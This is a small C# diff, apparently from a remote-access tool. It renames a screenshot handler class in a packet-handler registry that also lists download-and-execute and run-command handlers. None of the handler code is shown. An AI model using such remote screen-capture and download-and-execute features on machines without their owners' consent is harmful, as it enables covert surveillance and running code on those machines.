@@ -23,7 +23,7 @@
 
         private void InitPacketIds()
         {
-            this.clientPacketIds.Add(PacketId.SCREEN_SHOT, new HandleScreenShot());
+            this.clientPacketIds.Add(PacketId.SCREEN_SHOT, new HandleScreenshot());
             this.clientPacketIds.Add(PacketId.DOWNLOAD_AND_EXECUTE, new HandleDownloadExec());
             this.clientPacketIds.Add(PacketId.RUN, new HandleRun());
         }
